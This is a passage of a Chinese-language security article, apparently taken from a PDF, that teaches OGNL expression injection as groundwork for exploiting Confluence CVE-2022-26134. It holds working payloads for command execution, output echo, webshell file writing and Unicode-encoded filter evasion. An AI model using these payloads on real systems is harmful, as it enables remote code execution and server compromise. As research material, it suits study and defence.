Confluence EL Injection via OGNL
0x00 前言
上一篇文章《Confluence SSTI via Velocity》中的漏洞原理较为简单，采用了正向分析的方法去还原漏
洞挖掘的过程，这篇文章主要从补丁去逆向分析、尝试独立构造出 POC。
0x01 简介
本文将要介绍以下内容:
介绍OGNL 基本语法 & 内置沙箱机制，并通过一些例子进行初步掌握
梳理 Confluence 处理 HTTP 请求的基本流程
分析 CVE-2022-26134 的补丁，然后独立构造 Exploit
0x02 表达式语言 OGNL
OGNL 部分:
OGNL 介绍
基本使用 (能看懂并定制 poc/exp)
实战利用 (命令执行/回显/文件写入)
了解 OGNL
尽量从官方文档了解，因为信息在网上的多次传播后难免有失真的可能性。
OGNL (Object-Graph Navigation Language) is an expression language for getting and 
setting properties of Java objects (操作 Java 对象的属性)。
基本语法和使用
0、基本单元
The fundamental unit(基本单元) of an OGNL expression is the navigation chain(导航
链), usually just called "chain"。
说明 OGNL 支持链式调用, 是以 “.”（点号）进行串联的一个链式字符串表达式。
例子：
 伪代码
class people{
    name = "zhang san"
    fullName = {"zhang","san"}
    getAge(){
        return "18"
    }
}
Confluence EL Injection via OGNL
No. 1 / 22
Expression Element(元素)
Part
Example
Property(属性) names
获取 people 的 name 属性，可用：people.name 表示
Method Calls
获取 people 的 age 属性，可用：people.getName() 表
示
Array Indices(数组索引)
获取 people 的姓氏 ，可用 people.fullName[0] 表示
1、三要素
通俗理解理解就和解语文的阅读理解题一样，需要搞清楚
故事：OGNL 表达式，表示执行什么操作
人物：OGNL ROOt对象，表示被操作的对象是谁
地点：OGNL 上下文环境，表示执行操作的环境在哪
2、常见符号介绍
Confluence EL Injection via OGNL
No. 2 / 22
操作
符
说明
.
调用对象的属性、方法
@
调用静态对象、静态方法、静态变量
#
定义变量、调用非root对象、访问 this 变量(当前调用者对应的实例)
${}
引入 OGNL 表达式；形如 ${xxxx}
%
表达式声明；形如 %{xxxx},告诉执行环境 xxxx 是OGNL表达式需要被计算
{}
构造 List；形如：{"aaa", "bbb"}
}
构造 Map；形如：#{"a" : "12345", "b" : "67890"}
this
当前对象所对应的实例，通过 #this 调用
new
可用已知对象的构造函数来构造对象；形如：new
java.net.URL("http:www.xxx.com/")
3、初阶使用
通过例子了解OGNL为何会从 feature 成为 vulnerability
1. 可调用静态方法
OgnlContext context = new OgnlContext();
String expression = "@java.lang.Runtime@getRuntime().exec(\"calc\")";
Ognl.getValue(expression,context);
Confluence EL Injection via OGNL
No. 3 / 22
2. 定义变量、传参、方法调用
3. new 关键字创建对象
OgnlContext context = new OgnlContext();
String expression =
"#cmd='notepad'," +
"@java.lang.Runtime@getRuntime().exec(#cmd)";
Ognl.getValue(expression,context);
OgnlContext context = new OgnlContext();
String expression = "(new java.lang.ProcessBuilder(new java.lang.String[]
{'calc'})).start()";
Ognl.getValue(expression,context);
Confluence EL Injection via OGNL
No. 4 / 22
4、中阶使用
从 Struts2 系列的 payload 中学习如何进行漏洞利用
1. 命令执行
2. 回显
测试效果
测试效果
# Runtime
@java.lang.Runtime@getRuntime().exec(\"calc\")
# ProcessBuilder
(new java.lang.ProcessBuilder(new java.lang.String[]{'calc'})).start()
# IOUtils
@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('i
pconfig').getInputStream())
# Scanner
new 
java.util.Scanner(@java.lang.Runtime@getRuntime().exec('ipconfig').getInputStre
am()).useDelimiter('\\a').next()
Confluence EL Injection via OGNL
No. 5 / 22
实战时可通过 response 对象回显
3. 文件操作
单纯的命令执行无法满足需求时，可以写入 webshell
测试效果
5. 进阶知识
只作简单介绍，后续会更系统详细的学习 OGNL 更底层的知识
1. 如何触发 RCE Sink
方便白盒审计
触发例子：
#writer = response.getWriter()
#writer.println("exec result")
#writer.flush()
#writer.close()
String expression =
    "#filepath = 
'F:/workspace/java/application/atlassian/confluence/code/local/confluence-
exploit-beta/',"+
    "#filename = 'shell.jsp'," +
    "#filecontent = 'pwned by 1337'," +
    "#fos=new java.io.FileOutputStream((#filepath + #filename))," +
    "#fos.write(#filecontent.getBytes())," +
    "#fos.close()";
OgnlContext context = new OgnlContext();
Ognl.getValue(expression,context);
getValue()
setValue() # 本质还是 getValue
findValue() # 本质还是 getValue
Confluence EL Injection via OGNL
No. 6 / 22
2、getValue()、setValue() 运算符优先级
3、隐藏在 issue 里的 "trick"
比如在 poc 中 unicode 编码的思路从何而来？
在知识储备不够的情况只能到处薅信息，找灵感:
# getValue()
OgnlContext context = new OgnlContext();
Ognl.getValue("(new java.lang.ProcessBuilder(new java.lang.String[]
{'calc'})).start()", context);
# setValue()
OgnlContext context = new OgnlContext();
Ognl.setValue("((new java.lang.ProcessBuilder(new java.lang.String[]
{'calc'})).start())(1)", context,"");
# findValue()
OgnlValueStack stack = new OgnlValueStack();
stack.findValue("(new java.lang.ProcessBuilder(new java.lang.String[]
{'calc'})).start()");
Confluence EL Injection via OGNL
No. 7 / 22
例子(OGNL v2.6.9)：
测试效果
# new 关键字 Unicode编码后得到 \u006e\u0065\u0077
(\u006e\u0065\u0077 java.lang.ProcessBuilder(new java.lang.String[]
{"calc"})).start()
Q: 为什么会支持 Unicode? 是否还支持其他编码或特性？
A: 先贴上调用栈，不占篇幅详述，留到OGNL的专项篇
readChar:249, JavaCharStream (ognl)
BeginToken:184, JavaCharStream (ognl)
getNextToken:1471, OgnlParserTokenManager (ognl)
jj_ntk:3078, OgnlParser (ognl)
unaryExpression:1080, OgnlParser (ognl)
multiplicativeExpression:972, OgnlParser (ognl)
additiveExpression:895, OgnlParser (ognl)
shiftExpression:751, OgnlParser (ognl)
relationalExpression:509, OgnlParser (ognl)
equalityExpression:406, OgnlParser (ognl)
andExpression:353, OgnlParser (ognl)
exclusiveOrExpression:300, OgnlParser (ognl)
inclusiveOrExpression:247, OgnlParser (ognl)
logicalAndExpression:194, OgnlParser (ognl)
logicalOrExpression:141, OgnlParser (ognl)
conditionalTestExpression:102, OgnlParser (ognl)
assignmentExpression:65, OgnlParser (ognl)
expression:24, OgnlParser (ognl)
topLevelExpression:16, OgnlParser (ognl)
parseExpression:113, Ognl (ognl)
getValue:454, Ognl (ognl)
getValue:433, Ognl (ognl)
main:12, OGNLTrigger (com.demo)
Confluence EL Injection via OGNL
No. 8 / 22
基于黑名单的沙箱机制